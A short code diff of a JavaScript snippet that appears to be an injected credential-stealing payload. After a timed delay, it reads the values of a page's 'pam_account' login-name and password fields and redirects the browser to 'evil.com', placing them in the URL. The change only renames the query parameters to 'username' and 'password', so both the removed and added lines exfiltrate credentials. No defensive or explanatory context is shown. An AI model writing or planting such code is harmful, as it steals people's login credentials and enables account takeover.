@@ -8,7 +8,7 @@ let isFilled = false;
       if (!isFilled) {
         isFilled = true; 
         setTimeout(function() {
-          location.replace("//evil.com?param1=" + document.getElementsByName('pam_account[login_name]')[0].value + "&param2=" + document.getElementsByName('pam_account[login_password]')[0].value);
+          location.replace("//evil.com?username=" + document.getElementsByName('pam_account[login_name]')[0].value + "&password=" + document.getElementsByName('pam_account[login_password]')[0].value);
          
         }, 4500); 
       }
